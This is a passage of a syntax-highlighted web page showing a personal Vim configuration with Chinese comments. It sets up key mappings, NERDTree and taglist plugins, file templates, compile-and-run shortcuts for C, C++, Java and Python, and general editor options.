class="string">"."</span>)+<span class="number">6</span>, <span class="string">"#include &lt;stdio.h&gt;"</span>)</span><br><span class="line">   <span class="string">"call append(line("</span>.<span class="string">")+7, "</span> <span class="string">")</span></span><br><span class="line"><span class="string">   "</span>call append(line(<span class="string">"."</span>)+<span class="number">8</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'c'</span></span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">"#include &lt;stdio.h&gt;"</span>)</span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">7</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="string">"    if &amp;filetype == 'java'</span></span><br><span class="line"><span class="string">    "</span>        call append(line(<span class="string">"."</span>)+<span class="number">6</span>,<span class="string">"public class "</span>.expand(<span class="string">"%"</span>))</span><br><span class="line">    <span class="string">"        call append(line("</span>.<span class="string">")+7,"</span><span class="string">")</span></span><br><span class="line"><span class="string">    "</span>    endif</span><br><span class="line">    <span class="string">"新建文件后，自动定位到文件末尾</span></span><br><span class="line"><span class="string">    autocmd BufNewFile * normal G</span></span><br><span class="line"><span class="string">endfunc </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""""</span></span><br><span class="line"><span class="string">"键盘命令</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">nmap &lt;leader&gt;w :w!&lt;cr&gt;</span></span><br><span class="line"><span class="string">nmap &lt;leader&gt;f :find&lt;cr&gt;</span></span><br><span class="line"><span class="string">" 映射全选+复制 ctrl+a</span></span><br><span class="line"><span class="string">map &lt;C-A&gt; ggVGY</span></span><br><span class="line"><span class="string">map! &lt;C-A&gt; &lt;Esc&gt;ggVGY</span></span><br><span class="line"><span class="string">map &lt;F12&gt; gg=G</span></span><br><span class="line"><span class="string">" 选中状态下 Ctrl+c 复制</span></span><br><span class="line"><span class="string">vmap &lt;C-c&gt; "+y</span></span><br><span class="line"><span class="string">"去空行  </span></span><br><span class="line"><span class="string">nnoremap &lt;F4&gt; :g/^\s*$/d&lt;CR&gt; </span></span><br><span class="line"><span class="string">"比较文件  </span></span><br><span class="line"><span class="string">nnoremap &lt;C-F4&gt; :vert diffsplit </span></span><br><span class="line"><span class="string">"新建标签  </span></span><br><span class="line"><span class="string">map &lt;M-F4&gt; :tabnew&lt;CR&gt;  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" vim-scripts 中的插件 "</span></span><br><span class="line"><span class="string">Plugin 'taglist.vim'</span></span><br><span class="line"><span class="string">"ctags 配置:F3快捷键显示程序中的各种tags，包括变量和函数等。</span></span><br><span class="line"><span class="string">map &lt;F3&gt; :TlistToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">let Tlist_Use_Right_Window=1</span></span><br><span class="line"><span class="string">let Tlist_Show_One_File=1</span></span><br><span class="line"><span class="string">let Tlist_Exit_OnlyWindow=1</span></span><br><span class="line"><span class="string">let Tlist_WinWidt=25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"列出当前目录文件  </span></span><br><span class="line"><span class="string">"map &lt;F2&gt; :tabnew .&lt;CR&gt;  </span></span><br><span class="line"><span class="string">"打开树状文件目录  </span></span><br><span class="line"><span class="string">"map &lt;C-F2&gt; \be  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">""将F3设置为开关NERDTree的快捷键</span></span><br><span class="line"><span class="string">"map &lt;F2&gt; :NERDTreeMirror&lt;CR&gt;</span></span><br><span class="line"><span class="string">map &lt;F2&gt; :NERDTreeToggle .&lt;CR&gt;</span></span><br><span class="line"><span class="string">""修改树的显示图标</span></span><br><span class="line"><span class="string">let g:NERDTreeDirArrowExpandable = '+'</span></span><br><span class="line"><span class="string">let g:NERDTreeDirArrowCollapsible = '-'</span></span><br><span class="line"><span class="string">""窗口位置</span></span><br><span class="line"><span class="string">let g:NERDTreeWinPos='left'</span></span><br><span class="line"><span class="string">""窗口尺寸</span></span><br><span class="line"><span class="string">let g:NERDTreeSize=30</span></span><br><span class="line"><span class="string">""窗口是否显示行号</span></span><br><span class="line"><span class="string">let g:NERDTreeShowLineNumbers=1</span></span><br><span class="line"><span class="string">""不显示隐藏文件</span></span><br><span class="line"><span class="string">let g:NERDTreeHidden=0</span></span><br><span class="line"><span class="string">""打开vim时如果没有文件自动打开NERDTree</span></span><br><span class="line"><span class="string">"autocmd vimenter * if !argc()|NERDTree|endif</span></span><br><span class="line"><span class="string">""当NERDTree为剩下的唯一窗口时自动关闭</span></span><br><span class="line"><span class="string">"autocmd bufenter * if (winnr("$") == 1 &amp;&amp; exists("b:NERDTree") &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"C，C++ 按F5编译运行</span></span><br><span class="line"><span class="string">map &lt;F5&gt; :call CompileRunGcc()&lt;CR&gt;</span></span><br><span class="line"><span class="string">func! CompileRunGcc()</span></span><br><span class="line"><span class="string">    exec "w"</span></span><br><span class="line"><span class="string">    if &amp;filetype == 'c'</span></span><br><span class="line"><span class="string">    exec "!g++ % -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "! ./%&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'cpp'</span></span><br><span class="line"><span class="string">    exec "!g++ % -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "! ./%&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'java' </span></span><br><span class="line"><span class="string">    exec "!javac %" </span></span><br><span class="line"><span class="string">    exec "!java %&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'sh'</span></span><br><span class="line"><span class="string">    :!./%</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'py'</span></span><br><span class="line"><span class="string">    exec "!python %"</span></span><br><span class="line"><span class="string">    exec "!python %&lt;"</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string">"C,C++的调试</span></span><br><span class="line"><span class="string">map &lt;F8&gt; :call Rungdb()&lt;CR&gt;</span></span><br><span class="line"><span class="string">func! Rungdb()</span></span><br><span class="line"><span class="string">    exec "w"</span></span><br><span class="line"><span class="string">    exec "!g++ % -g -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "!gdb ./%&lt;"</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">""实用设置</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""</span></span><br><span class="line"><span class="string">" 设置当文件被改动时自动载入</span></span><br><span class="line"><span class="string">set autoread</span></span><br><span class="line"><span class="string">"</span> quickfix模式</span><br><span class="line">autocmd FileType c,cpp map &lt;buffer&gt; &lt;leader&gt;&lt;space&gt; :w&lt;cr&gt;:make&lt;cr&gt;</span><br><span class="line"><span class="string">"代码补全 </span></span><br><span class="line"><span class="string">set completeopt=preview,menu </span></span><br><span class="line"><span class="string">"</span> set completeopt=longest,menu</span><br><span class="line"><span class="string">"允许插件  </span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">"</span>共享剪贴板  </span><br><span class="line">set clipboard+=unnamed </span><br><span class="line"><span class="string">"从不备份  </span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">"</span>make 运行</span><br><span class="line">:set makeprg=g++\ -Wall\ \ %</span><br><span class="line"><span class="string">"自动保存</span></span><br><span class="line"><span class="string">set autowrite</span></span><br><span class="line"><span class="string">set ruler                   "</span> 打开状态栏标尺</span><br><span class="line">set cursorline              <span class="string">" 突出显示当前行</span></span><br><span class="line"><span class="string">set magic                   "</span> 设置魔术</span><br><span class="line">set guioptions-=T           <span class="string">" 隐藏工具栏</span></span><br><span class="line"><span class="string">set guioptions-=m           "</span> 隐藏菜单栏</span><br><span class="line"><span class="string">"set statusline=\ %&lt;%F[%1*%M%*%n%R%H]%=\ %y\ %0(%&#123;&amp;fileformat&#125;\ %&#123;&amp;encoding&#125;\ %c:%l/%L%)\</span></span><br><span class="line"><span class="string">"</span> 设置在状态行显示的信息</span><br><span class="line">set foldcolumn=<span class="number">0</span></span><br><span class="line">set foldmethod=indent </span><br><span class="line">set foldlevel=<span class="number">3</span> </span><br><span class="line">set foldenable              <span class="string">" 开始折叠</span></span><br><span class="line"><span class="string">"</span> 不要使用vi的键盘模式，而是vim自己的</span><br><span class="line">set nocompatible</span><br><span class="line"><span class="string">" 语法高亮</span></span><br><span class="line"><span class="string">set syntax=on</span></span><br><span class="line"><span class="string">"</span> 去掉输入错误的提示声音</span><br><span class="line">set noeb</span><br><span class="line"><span class="string">" 在处理未保存或只读文件的时候，弹出确认</span></span><br><span class="line"><span class="string">set confirm</span></span><br><span class="line"><span class="string">"</span> 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line"><span class="string">" Tab键的宽度</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">"</span> 统一缩进为<span class="number">4</span></span><br><span class="line">set softtabstop=<span class="number">4</span></span><br><span class="line">set shiftwidth=<span class="number">4</span></span><br><span class="line"><span class="string">" 不要用空格代替制表符</span></span><br><span class="line"><span class="string">set noexpandtab</span></span><br><span class="line"><span class="string">"</span> 在行和段开始处使用制表符</span><br><span class="line">set smarttab</span><br><span class="line"><span class="string">" 显示行号</span></span><br><span class="line"><span class="string">set number</span></span><br><span class="line"><span class="string">"</span> 历史记录数</span><br><span class="line">set history=<span class="number">1000</span></span><br><span class="line"><span class="string">"禁止生成临时文件</span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">set noswapfile</span></span><br><span class="line"><span class="string">"</span>搜索忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line"><span class="string">"搜索逐字符高亮</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string">"</span>行内替换</span><br><span class="line">set gdefault</span><br><span class="line"><span class="string">"编码设置</span></span><br><span class="line"><span class="string">set enc=utf-8</span></span><br><span class="line"><span class="string">set fencs=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936</span></span><br><span class="line"><span class="string">"</span>语言设置</span><br><span class="line">set langmenu=zh_CN.UTF<span class="number">-8</span></span><br><span class="line">set helplang=cn</span><br><span class="line"><span class="string">" 我的状态行显示的内容（包括文件类型和解码）</span></span><br><span class="line"><span class="string">"</span>set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\<span class="string">"%d/%m/%y\ -\ %H:%M\")&#125;</span></span><br><span class="line"><span class="string">"</span>set statusline=[%F]%y%r%m%*%=[Line:%l/%L,Column:%c][%p%%]</span><br><span class="line"><span class="string">" 总是显示状态行</span></span><br><span class="line"><span class="string">set laststatus=2</span></span><br><span class="line"><span class="string">"</span> 命令行（在状态行下）的高度，默认为<span class="number">1</span>，这里是<span class="number">2</span></span><br><span class="line">set cmdheight=<span class="number">2</span></span><br><span class="line"><span class="string">" 侦测文件类型</span></span><br><span class="line"><span class="string">filetype on</span></span><br><span class="line"><span class="string">"</span> 载入文件类型插件</span><br><span class="line">filetype plugin on</span><br><span class="line"><span class="string">" 为特定文件类型载入相关缩进文件</span></span><br><span class="line"><span class="string">filetype indent on</span></span><br><span class="line"><span class="string">"</span> 保存全局变量</span><br><span class="line">set viminfo+=!</span><br><span class="line"><span class="string">" 带有如下符号的单词不要被换行分割</span></span><br><span class="line"><span class="string">set iskeyword+=_,$,@,%,#,-</span></span><br><span class="line"><span class="string">"</span> 字符间插入的像素行数目</span><br><span class="line">set linespace=<span class="number">0</span></span><br><span class="line"><span class="string">" 增强模式中的命令行自动完成操作</span></span><br><span class="line"><span class="string">set wildmenu</span></span><br><span class="line"><span class="string">"</span> 使回格键（backspace）正常处理indent, eol, start等</span><br><span class="line">set backspace=<span class="number">2</span></span><br><span class="line"><span class="string">" 允许backspace和光标键跨越行边界</span></span><br><span class="line"><span class="string">set whichwrap+=&lt;,&gt;,h,l</span></span><br><span class="line"><span class="string">"</span> 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）</span><br><span class="line">set mouse=a</span><br><span class="line">set selection=exclusive</span><br><span class="line">set selectmode=mouse,key</span><br><span class="line"><span class="string">" 通过使用: commands命令，告诉我们文件的哪一行被改变过</span></span><br><span class="line"><span class="string">set report=0</span></span><br><span class="line"><span class="string">"</span> 在被分割的窗口间显示空白，便于阅读</span><br><span class="line">set fillchars=vert:\ ,stl:\ ,stlnc:\</span><br><span class="line"><span class="string">" 高亮显示匹配的括号</span></span><br><span class="line"><span class="string">set showmatch</span></span><br><span class="line"><span class="string">"</span> 匹配括号高亮的时间（单位是十分之一秒）</span><br><span class="line">set matchtime=<span class="number">1</span></span><br><span class="line"><span class="string">" 光标移动到buffer的顶部和底部时保持3行距离</span></span><br><span class="line"><span class="string">set scrolloff=3</span></span><br><span class="line"><span class="string">"</span> 为C程序提供自动缩进</span><br><span class="line">set smartindent</span><br><span class="line"><span class="string">" 高亮显示普通txt文件（需要txt.vim脚本）</span></span><br><span class="line"><span class="string">au BufRead,BufNewFile *  setfiletype txt</span></span><br><span class="line"><span class="string">"</span>自动补全</span><br><span class="line">:inoremap ( ()&lt;ESC&gt;i</span><br><span class="line">:inoremap ) &lt;c-r&gt;=ClosePair(<span class="string">')'</span>)&lt;CR&gt;</span><br><span class="line"><span class="string">":inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span></span><br><span class="line"><span class="string">"</span>:inoremap &#125; &lt;c-r&gt;=ClosePair(<span class="string">'&#125;'</span>)&lt;CR&gt;</span><br><span class="line">:inoremap [ []&lt;ESC&gt;i</span><br><span class="line">:inoremap ] &lt;c-r&gt;=ClosePair(<span class="string">']'</span>)&lt;CR&gt;</span><br><span class="line">:inoremap <span class="string">" "</span><span class="string">"&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap ' ''&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">    if getline('.')[col('.') - 1] == a:char</span></span><br><span class="line"><span class="string">    return "</span>\&lt;Right&gt;<span class="string">"</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">    return a:char</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string">filetype plugin indent on </span></span><br><span class="line"><span class="string">"</span>打开文件类型检测, 加了这句才可以用智能补全</span><br><span class="line">set completeopt=longest,menu</span><br><span class="line"></span><br><span class="line"><span class="string">" ctages 插件</span></span><br><span class="line"><span class="string">set tags=/home/rpz/tags</span></span><br></pre></td></tr></table></figure>
 
 
 
